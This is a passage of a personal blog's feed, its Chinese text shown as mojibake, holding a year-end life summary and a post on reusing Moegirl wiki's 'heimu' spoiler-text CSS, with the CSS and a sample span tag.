title="0x05"></a>0x05</h4><p>æœç„¶é«˜ä¸­çš„äººé™…å…³ç³»æœ€ç»ˆè¿˜æ˜¯ç‚¸äº†ã€‚ç‚¸å®Œä¹‹åæœ€å°¬çš„æ—¶å€™å°±æ˜¯å‘†åœ¨å®¿èˆçš„æ—¶å€™ã€‚æ—¶é—´çº¿çš„åˆ»æ„é”™å¼€ä½¿æˆ‘æ·±åˆ»ä½“ä¼šåˆ°äº†ä»€ä¹ˆå«åšå½“é¢ä¸€å¥—èƒŒé¢ä¸€å¥—ã€‚å¥½åœ¨æˆ‘æœ€åä»€ä¹ˆéƒ½æ²¡æœ‰è¯´ï¼Œè¿™ä¹Ÿè®¸æ˜¯æœ€ä¼˜è§£çš„ä¸€ç§ã€‚</p><h4 id="Cold-Air-is-Innocent"><a href="#Cold-Air-is-Innocent" class="headerlink" title="Cold Air is Innocent"></a>Cold Air is Innocent</h4><p>æ·±äºŒå¤–çš„æ—©æ™¨å¤§æŠµæ˜¯ä»æ‰“å¼€é˜³å°é—¨æ„Ÿå—ç¬¬ä¸€è‚¡å‡‰é£å¼€å§‹çš„ï¼Œå¯æ˜¯é£ä»æ¥å°±æ˜¯æ— è¾œçš„ï¼Œä»–ä¸æ‡‚ä¸ºä»€ä¹ˆä¸€æ—©ä¸Šæ²¡æœ‰äººè¯´è¯ï¼Œä»–ä¸æ‡‚ä¸ºä»€ä¹ˆè¦è¡Œè‰²åŒ†åŒ†ï¼Œä»–ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆé—¨è¦è¢«é‡é‡çš„å…³ä¸Šå‡ ä¸‹ç„¶åå†æ‰“å¼€ã€‚ä»–åªçŸ¥é“ï¼Œå†è¿‡å‡ åˆ†é’Ÿï¼Œä»–å°±è¦è¢«è£¹æŒŸåœ¨è›‹æŒå’ŒåŒ…å­çš„é¦™æ°”é‡Œäº†ã€‚</p><h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p>é«˜è€ƒå‰æˆ‘æ€ä¹ˆä¹Ÿä¸ä¼šçŸ¥é“å®ƒæ¥å¾—ç«Ÿè¿™ä¹ˆå¿«ï¼Œå¿«åˆ°æˆ‘éƒ½æ²¡æ¥çš„åŠåšå¥½å‘¨å…¨çš„å‡†å¤‡ï¼›å¿«åˆ°æˆ‘è¿˜æœ‰å¥½å¤šäº‹æ²¡æ¥å¾—åŠåšï¼›å¿«åˆ°æœ‰å¥½å¤šäº‹æƒ…è¿˜æ²¡è¯´å‡ºå£ã€‚å½“æˆ‘æ”¾ä¸‹æ£€æŸ¥å¥½çš„è‹±è¯­å·å­ï¼Œæ•´ç†å¥½è¯•å·çš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æœ‰äº›æ²¡æ¥å¾—åŠåšçš„äº‹æƒ…å†ä¹Ÿæ²¡åŠæ³•åšäº†ã€‚</p><h4 id="The-Air-is-Bitter-Sweet"><a href="#The-Air-is-Bitter-Sweet" class="headerlink" title="The Air is Bitter-Sweet"></a>The Air is Bitter-Sweet</h4><p>ç©ºæ°”è§‰å¾—è¿™æ˜¯å¥‡æ€ªçš„ä¸€å¤©ï¼Œå› ä¸ºå½“ä»–è¿˜æ²æµ´åœ¨é˜³å…‰ä¸‹çš„æ—¶å€™ï¼Œä»–å°±è§‰å¾—è‡ªå·±çš„å‘³é“å˜äº†ã€‚ä¸åƒä»¥å¾€çš„æ˜¯ï¼Œè¿™ç§æ°”å‘³ä»–ä¸å¤ªç†Ÿæ‚‰ï¼Œä»¿ä½›æ˜¯ç§¯æœˆä¹‹å‰çš„å‰è¾ˆè·Ÿä»–è¯´è¿‡çš„é‚£ç§ã€‚ä»–å¬ç”µç¯è¯´ï¼Œé«˜è€ƒå€’è®¡æ—¶çš„æ˜¾ç¤ºå±è¢«å…³æ‰äº†ã€‚</p><p>å¤ªé˜³ç…§æ—§å‡èµ·ï¼Œé˜³å°çš„å†·é£é‡é‡åœ°æ’ä¸Šäº†ç»ç’ƒé—¨ï¼Œå®šç›ä¸€çœ‹ï¼Œé‡Œé¢ä¼¼ä¹å°‘äº†äº›ä¸œè¥¿ã€‚</p><p>å¯æ˜¯åˆ°åº•å°‘äº†ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ æ•å¤´æ˜¯çŸ¥é“çš„ï¼Œç”µç¯ä¹Ÿæ˜¯çŸ¥é“çš„ã€‚</p><p>å½“çƒ­é—¹çš„å¤œæ²¡æœ‰å¦‚æœŸè€Œè‡³ï¼Œæœˆäº®ä¼¼ä¹ä¹Ÿæ„è¯†åˆ°ï¼Œæ—¥å­çš„è«æ¯”ä¹Œæ–¯ç¯åœ¨æ—¶å…‰çš„æŒ‡ç¤ºä¸‹æ¢äº†ä¸€æ¡ã€‚</p><h4 id="The-Dawn"><a href="#The-Dawn" class="headerlink" title="The Dawn"></a>The Dawn</h4><p>ä¸å‡ºæ„å¤–åœ°å»åˆ°äº† HUT é‡åˆ°äº†å¯å¯çˆ±çˆ±çš„å¤§å®¶ ï¼ˆ<span class="" title="å¿—æ„¿å¡«æŠ¥çš„æ—¶å€™çœŸçš„å¸®äº†å¤§å¿™">å‰æ’æ„Ÿè°¢æœºæ¢°å·¥ç¨‹çš„é˜¿æ¢“å­¦å§</span>ï¼‰</p><p>è¿˜æ˜¯åˆ†æ–¹é¢è¯´ä¸€è¯´å§ <span class="heimu" title="ä½ å‘ç°äº†ï¼ï¼">æ²¡æœ‰æ•…äº‹ï¼Œä¸çŸ¥é“å’‹å†™æ„è¯†æµ</span> </p><h5 id="Study"><a href="#Study" class="headerlink" title="Study"></a>Study</h5><p>å¤§ä¸€ä¸Šçš„æ—¥å¸¸è¯¾ä¸šåº”è¯¥ç®—æ˜¯è¿˜è¡Œçš„ï¼Œè™½ç„¶é«˜æ•°å·®ç‚¹å°±æŒ‚äº†ï¼Œä½†æ˜¯é«˜è€ƒæ•°å­¦ 70+ çš„æˆ‘è¿˜æ˜¯éœ€è¦æ›´å¤šæ—¶é—´å»åŠªåŠ›çš„ã€‚æ¥ä¸‹æ¥çš„ä¸€å¹´é‡Œå¥½å¥½å­¦æ•°å­¦å’Œç‰©ç†ï¼Œé¡ºå¸¦é”»ç‚¼é”»ç‚¼èº«ä½“ã€‚<span class="heimu" title="å˜¿å˜¿:)">ä½“è‚²ä¹Ÿå·®ç‚¹æŒ‚ç§‘äº†</span></p><p>å¾ˆå¹¸è¿çš„æ˜¯é¡ºåˆ©åœ°é€šè¿‡äº†é€‰æ‹”è¿›å…¥äº†å®éªŒå®¤çš„ç½‘ç»œå®‰å…¨ç»„ã€‚ <span class="heimu" title="å˜¿å˜¿:)">æˆ‘è¶…å–œæ¬¢</span> ç›®å‰çœ‹æ¥ï¼Œæˆ‘è¿˜æ˜¯å¾ˆèœçš„ã€‚PHP å•¥çš„ä¹Ÿè¿˜è¦å¥½å¥½å­¦ï¼Œé¢˜ä¹Ÿæ²¡æ€ä¹ˆåˆ·è¿‡ã€‚æ¥ä¸‹æ¥çš„ä¸€ä¸ªå­¦æœŸé‡Œï¼Œè¦äº‰å–æˆä¸ºä¸€ä¸ªåˆæ ¼çš„ CTFer ã€‚</p><h5 id="Social-Communication"><a href="#Social-Communication" class="headerlink" title="Social Communication"></a>Social Communication</h5><p>åœ¨å¤§å­¦é‡Œï¼Œæˆ‘é‡åˆ°äº†æœ€å¥½çš„å‡ ä¸ªèˆå‹ ï¼ˆ<span class="" title="ä½ ä»¬çœŸçš„æ£’ï¼ï¼ï¼">å‰æ’æ„Ÿè°¢å¼ºå“¥ã€æ°å“¥ å’Œ <span style="font-family:Consolas">ll</span></span>ï¼‰ä¹Ÿè®¤è¯†äº†å¾ˆå¤šå¯å¯çˆ±çˆ±çš„äººã€‚</p><h5 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h5><p>èƒ½å¤Ÿå’Œå›¢å­¦ä¼šå®£ä¼ éƒ¨çš„å¤§å®¶å…±äº‹æˆ–è®¸æ˜¯ä¸€ç§ç¼˜åˆ†ã€‚å’Œå¤§å®¶ä¸€èµ·äº¤æµä½¿æˆ‘æ„Ÿå—åˆ°äº†ä¸€ç§ç¥å¥‡çš„å¼€å¿ƒçš„æ„Ÿè§‰ï¼Œè¿™åœ¨ä»¥å¾€é«˜ä¸­æ—¶å¸¦ç¤¾å›¢æŠ‘æˆ–æ˜¯å­¦ç”Ÿä¼šçš„å·¥ä½œä¸­æˆ‘éƒ½ä¸æ›¾æ„Ÿå—è¿‡ã€‚åœ¨è¿™åŠå¹´é‡Œï¼Œæˆ‘ä»¬ä¸€èµ·æ‹¥æœ‰ç€è®¸å¤šå¿«ä¹æ—¶å…‰ã€‚åœ¨æ–°çš„ä¸€å¹´é‡Œï¼Œæˆ‘ä»æƒ³å’Œä½ ä»¬ä¸€èµ·å¿«ä¹å‰è¡Œã€‚<span class="heimu" title="å˜¿å˜¿:)">å¸Œæœ›ä»Šå¹´çš„æˆ‘èƒ½ç»™ä½ ä»¬å‘æŸ æª¬å‘³çš„<em>Oishi</em></span></p><h5 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h5><p>ç”Ÿæ´»æ— ç–‘æ˜¯å¿™ç¢Œçš„ï¼Œä½†æ€»å½’æ˜¯æœ‰äº›ç²¾å½©çš„æ—¶åˆ»ã€‚å„ç§äº‹æƒ…çš„é¡ºåˆ©è¿›è¡Œä½¿æˆ‘æ—¶åˆ»æ„Ÿå—åˆ°ä¸€ç§å¹¸ç¦æ„Ÿã€‚è¿™ç§å¹¸ç¦æ„Ÿä¹Ÿé©±ä½¿ç€æˆ‘æŠŠå®ƒè½¬å˜æˆåŠ¨åŠ›ã€‚ä¹Ÿè®¸è‹¥å¹²å¹´ä¹‹åï¼Œä»ç„¶èƒ½å¤Ÿæƒ³èµ·å’Œ Duidui åƒå®µå¤œçš„æ™šä¸Šï¼›ä»ç„¶èƒ½å¤Ÿæƒ³èµ·å’Œ Lucifer ä¸€èµ·ç‚¹å¤–å–æŒ¤æ—¶é—´å†™é¢˜çœ‹ rank çš„æ—¥å­ï¼›ä»ç„¶èƒ½å¤Ÿæƒ³èµ·åœ¨æ™šå½’çš„æ—¶å€™èˆå‹æ‰“æ¥çš„ç”µè¯ã€‚</p><h5 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h5><p>å†™ blog ä¹Ÿç®—æ˜¯ä¸€ç›´ä»¥æ¥æ²¡æœ‰æ”¾ä¸‹è¿‡çš„æƒ³æ³•ï¼Œä»ä¸€å¼€å§‹çš„ WordPress åˆ° Emlog å†åˆ° Typecho ä¹ƒè‡³ç°åœ¨çš„hexo + GitPageï¼Œä¸€è·¯ä¸Šé‡åˆ°äº†ä¸å°‘çš„å‘ï¼Œç°åœ¨æ€»ç®—æ˜¯å¤§è‡´è¾¾åˆ°äº†è‡ªå·±çš„æƒ³æ³•ï¼Œ <span class="heimu" title="å˜¿å˜¿:)">å¾ˆå¤šç»†èŠ‚è¿˜è¦å®Œå–„</span> æ¥ä¸‹æ¥å°±æ˜¯å®Œæˆä¸€ä¸ªè‡ªå·±çš„ä¸»é¢˜ã€‚ <span class="heimu" title="å˜¿å˜¿:)">æ¯•ç«Ÿæ”¹çš„ä¸œè¥¿ä¼šè¶Šæ¥è¶Šå¤šï¼Œé€æ¸å½¢æˆè‡ªå·±çš„é£æ ¼</span> </p><p>åœ¨å†™ç•™è¨€æ¿çš„ç©ºæ¡£ï¼ŒæŠŠ BingWallpaper Fetch é‡æ„äº†ä¸€æ¬¡ã€‚ï¼ˆç°åœ¨åº”è¯¥ç”¨åˆ° .Net 4.7.2 äº†ï¼‰æ€»çš„æ¥è¯´ä½“éªŒè¿˜æ˜¯æå‡äº†ä¸å°‘çš„ã€‚</p><p>è‡³äºéŸ³ä¹ Fetch ï¼Œä»Šå¹´å€’æ˜¯æ²¡æ€ä¹ˆåŠ¨è¿‡ï¼Œä¸€æ–¹é¢æ²¡æœ‰å¤§ç‰‡çš„æ—¶é—´ç ”ç©¶è§£åŒ…ï¼Œä¸€æ–¹é¢ä¸€å®šç¨‹åº¦ä¸Šå…¶å®ä¾µæƒäº†ï¼ˆè¦åšæ–°æ—¶ä»£ç¤¾ä¼šä¸»ä¹‰å¥½é’å¹´å˜›ï¼‰ï¼Œæ‰€ä»¥å°±æš‚æ—¶æä¸‹äº†ã€‚</p><p>æ–°çš„ä¸€å¹´é‡Œå˜› å¥½å¥½å­¦ å¥½å¥½ç”¨ å†²å†²å†²</p><h4 id="The-Secret"><a href="#The-Secret" class="headerlink" title="The Secret"></a>The Secret</h4><p>ç°åœ¨æƒ³èµ·æ¥å˜›ï¼Œæœç„¶é«˜ä¸­çš„æ—¶å€™è¿˜æ˜¯æ¯”è¾ƒæ€‚ã€‚å¤§å­¦äº†è¿˜æ˜¯å¾—å‹‡æ•¢ä¸€ç‚¹ï¼Œä¸èƒ½å†é”™è¿‡äº†ã€‚ <span class="heimu" title="å˜¿å˜¿:)">å¸Œæœ›ä»Šå¹´çš„æˆ‘èƒ½ç»™ä½ ä»¬å‘æŸ æª¬å‘³çš„<em>Oishi</em></span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YearlySummary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¢ç©¶æ–‡å­—é»‘å¹•(Heimu)</title>
      <link href="/zh-CN/posts/6e96747c.html"/>
      <url>/zh-CN/posts/6e96747c.html</url>
      
        <content type="html"><![CDATA[<p>blog ç»ˆäºæœ‰äº›ä¸œè¥¿å¯å†™äº†ï¼Œä¹Ÿç®—æ˜¯æ…¢æ…¢åœ°å¼„èµ·æ¥äº†ã€‚æ–‡ç« æ€»å½’ä¸èƒ½åƒå†™å…¬ä¼—å·æ¨æ–‡ä¸€æ ·æ­£ç»ï¼Œæ‰€ä»¥å°±æƒ³ç€ç¨å¾®çš®ä¸€ä¸‹ã€‚ä½†æ˜¯ä¹ æƒ¯äº†æ­£ç»ä¸€æ—¶æ‰¾ä¸åˆ°åˆ‡å…¥ç‚¹ï¼Œæœ‰ç§åªèƒ½æ„ä¼šçš„ç¥å¥‡æ„Ÿè§‰ã€‚<span class="heimu" title="ä½ å‘ç°æˆ‘å•¦(â—Ë‡âˆ€Ë‡â—)">ä¸€æ–¹é¢æ€•çš®è¿‡äº†å¤´ï¼Œä¸€æ–¹é¢æ€•è¢«æ­£ç»åœ°å¯¹å·å…¥åº§</span> æ­£å¥½æƒ³èµ·äº†ä¹‹å‰èŒå¨˜ç™¾ç§‘æœ‰ç§å¼•ç”¨åœ¨æ–‡ç« ä¸­çš„ä¸œè¥¿å«åšâ€œé»‘å¹•â€ã€‚äºæ˜¯å°±æƒ³è‡ªå·±æ•´æ¥ç©ä¸€ç©ã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="ç”¨JavaScriptæ£€æµ‹ï¼Ÿ"><a href="#ç”¨JavaScriptæ£€æµ‹ï¼Ÿ" class="headerlink" title="ç”¨JavaScriptæ£€æµ‹ï¼Ÿ"></a>ç”¨JavaScriptæ£€æµ‹ï¼Ÿ</h4><p>å› ä¸ºæƒ³å®ç°çš„æ•ˆæœå·®ä¸å¤šå°±æ˜¯èŒå¨˜ç™¾ç§‘ä¸Šçš„é‚£ç§æ•ˆæœï¼Œç²—ç•¥åœ°çœ‹äº†ä¸€ä¸‹ç½‘é¡µçš„æºä»£ç ï¼Œå‘ç°æ„é€ å¾ˆç®€å•ï¼Œåªæ˜¯åŠ äº†ä¸ª <code>class="heimu"</code> ï¼Œäºæ˜¯ç†æ‰€å½“ç„¶åœ°æƒ³ç€ç”¨ JS æ£€æµ‹ä¸€ä¸‹é¼ æ ‡ç§»åŠ¨çš„åŒºåŸŸç„¶åæ›´æ”¹å±æ€§ã€‚ä½†æ˜¯ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼ŒèŒå¨˜ç™¾ç§‘ä¸Šçš„é»‘å¹•æ˜¾å¾—æ¯”è¿™ä¹ˆå¤„ç†çš„æ›´åŠ çµåŠ¨ã€‚ä¸€æ–¹é¢ï¼Œå®ƒæœ‰ä¸€ä¸ªæ¸å˜çš„æ•ˆæœï¼Œè€Œä¸æ˜¯ä¸€ä¸‹å­å°±â€œå‡ºç°â€ï¼Œæ˜¾å¾—å¾ˆå¥‡æ€ªã€‚äºæ˜¯æˆ‘æŠ›å¼ƒäº†è¿™ä¸ªæ€è·¯ã€‚</p><h4 id="CSSçš„ç§»æ¤"><a href="#CSSçš„ç§»æ¤" class="headerlink" title="CSSçš„ç§»æ¤"></a>CSSçš„ç§»æ¤</h4><p>åœ¨èŒå¨˜ç™¾ç§‘çš„ç½‘é¡µæºä»£ç ä¸­ï¼Œæˆ‘å‘ç°äº† <a href="https://zh.moegirl.org/load.php?debug=false&amp;lang=zh-hans&amp;modules=site.styles&amp;only=styles&amp;skin=vector">https://zh.moegirl.org/load.php?debug=false&amp;lang=zh-hans&amp;modules=site.styles&amp;only=styles&amp;skin=vector</a> è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ã€‚æ‰“å¼€ä¹‹åå‘ç°æ˜¯ä¸ªå‹ç¼©çš„æºä»£ç ï¼Œæ­£å‡†å¤‡æ ¼å¼åŒ–æ¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°äº†é“¾æ¥é‡Œçš„ <code>debug</code> å‚æ•°ï¼Œäºæ˜¯é¡ºæ‰‹æ”¹æˆäº† <code>true</code> ï¼Œäºæ˜¯å¾—åˆ°äº†æ ¼å¼åŒ–çš„æºä»£ç ï¼Œé¡ºåˆ©æ‰¾åˆ°äº†é»‘å¹•éƒ¨åˆ†çš„å®ç°ä»£ç ï¼Œå±…ç„¶æ˜¯ä¸€æ®µcss <span class="heimu" title="å¤ªèœäº†ï¼">æœç„¶æˆ‘è¿˜æ˜¯cssèœé¸Ÿ</span></p><p>é»‘å¹•çš„å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*æ–‡ä»¶èŠ‚é€‰è‡ªCommon.css*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">MediaWiki:Common.css</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * æ”¾ç½®äºè¿™é‡Œçš„CSSå°†åº”ç”¨äºæ‰€æœ‰çš®è‚¤</span></span><br><span class="line"><span class="comment"> * èŒå¨˜ç™¾ç§‘ä»…å¼€æ”¾Vectorçš®è‚¤</span></span><br><span class="line"><span class="comment"> * è¯·å°Šé‡èŒå¨˜ç™¾ç§‘ç‰ˆæƒï¼Œä»¥ä¸‹ä»£ç é™¤éæ³¨æ˜å‡æ˜¯ç®¡ç†å‘˜æ‰‹æ•²å‡ºæ¥çš„ï¼ï¼ï¼å¤åˆ¶éœ€è¦æ³¨æ˜æºè‡ªèŒå¨˜ç™¾ç§‘ï¼Œå¹¶ä¸”é™„ä¸ŠURLåœ°å€http://zh.moegirl.org/MediaWiki:Common.css</span></span><br><span class="line"><span class="comment"> * ç‰ˆæƒåå®šï¼šçŸ¥è¯†å…±äº« ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* é»‘å¹•æ¨¡æ¿é…åˆCSS */</span></span><br><span class="line"><span class="comment">/* æŠŠè¿™å‡ è¡Œå•ç‹¬æ‹å‡ºæ¥å†™ï¼Œå¦åˆ™ä¼šè¢«Firefoxåˆå¹¶åˆ°â€œ.heimu aâ€è¿™æ¡è§„åˆ™ï¼Œç„¶ååˆè¢«ä¸Šé¢çš„â€œç‚¹è¿‡å¤–é“¾ä¸å˜è‰²â€è§„åˆ™override */</span></span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.external</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.external</span><span class="selector-pseudo">:visited</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.extiw</span>,</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.extiw</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#252525</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">a</span> <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-class">.heimu</span> <span class="selector-tag">a</span><span class="selector-class">.new</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#252525</span>;</span><br><span class="line">    <span class="attribute">text-shadow</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:active</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: lightblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.heimu</span><span class="selector-class">.off</span> <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">body</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.heimu_toggle_on</span>) <span class="selector-class">.new</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.heimu</span><span class="selector-class">.off</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: color .<span class="number">13s</span> linear;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#BA0000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æŠŠè¿™éƒ¨åˆ†cssä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œ<del>åœ¨æ–‡ç« çš„é¡¶éƒ¨å¼•ç”¨</del> ç›´æ¥å°†è¿™ä¸€å¥æ”¾è¿› <code>head.ejs</code> é‡Œå’Œé¡µé¢ä¸€èµ·åŠ è½½å°±å¯ä»¥å…¨å±€ä¸€èµ·ç”¨å•¦ï¼<span class="heimu" title="æˆ‘è§‰å¾—å¯">æ•ˆæœä¹Ÿä¼šå¥½ä¸€äº›</span></p><p>æˆ–è€…ç›´æ¥éƒ¨ç½²åˆ° jsDelivr ä¸Šï¼Œå¦‚ä¸‹å¼•ç”¨å³å¯ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr/css/moegirl.org.heimu.min.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æ–‡ç« ä¸­ç”¨htmlä»£ç å†™æ ‡ç­¾å°±è¾¾æˆäº†ç§»æ¤çš„æ•ˆæœ</p><p><span class="heimu" title="a small test">Hello World!</span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;heimu&quot;</span> <span class="attr">title</span>=<span class="string">&quot;a small test&quot;</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ¼”ç»ä½œå“çš„å£°æ˜"><a href="#æ¼”ç»ä½œå“çš„å£°æ˜" class="headerlink" title="æ¼”ç»ä½œå“çš„å£°æ˜"></a>æ¼”ç»ä½œå“çš„å£°æ˜</h4><p>ä»èŒå¨˜ç™¾ç§‘æºä»£ç æ–‡ä»¶çš„å£°æ˜æ¥çœ‹ï¼Œå…¶ä¸¥æ ¼æªå®ˆ<strong>çŸ¥è¯†å…±äº« ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 3.0</strong>ï¼Œåœ¨è¿™ä¸ªç‰ˆæƒåå®šä¸­ï¼Œæœ‰ä»¥ä¸‹åŸæ–‡ï¼š</p><p><strong>æˆæƒ</strong></p><blockquote>æ ¹æ®æœ¬è®¸å¯çš„æ¡æ¬¾å’Œæ¡ä»¶ï¼Œè®¸å¯äººåœ¨æ­¤æˆäºˆæ‚¨å…¨çƒæ€§ã€å…ç‰ˆç¨ã€éç‹¬å å¹¶ä¸”åœ¨æœ¬ä½œå“çš„è‘—ä½œæƒå­˜ç»­æœŸé—´å†…å‡æœ‰æ•ˆçš„è®¸å¯ï¼Œå°±æœ¬ä½œå“è¡Œä½¿ä»¥ä¸‹æƒåˆ©ï¼š1.å¤åˆ¶æœ¬ä½œå“æˆ–å°†æœ¬ä½œå“æ”¶å…¥ä¸€ä¸ªæˆ–å¤šä¸ªæ±‡ç¼–ä½œå“ä¸­ï¼Œä»¥åŠå¤åˆ¶æ±‡ç¼–ä½œå“ä¸­æ”¶å½•çš„æœ¬ä½œå“ï¼›2.<b>åˆ›ä½œå’Œå¤åˆ¶æ¼”ç»ä½œå“ï¼Œä½†æ˜¯ä»»ä½•æ¼”ç»ä½œå“ï¼ŒåŒ…æ‹¬ä»»ä½•å½¢å¼çš„ç¿»è¯‘ä½œå“ï¼Œå‡éœ€ä»¥åˆç†æ–¹å¼æ¸…æ¥šåœ°æ 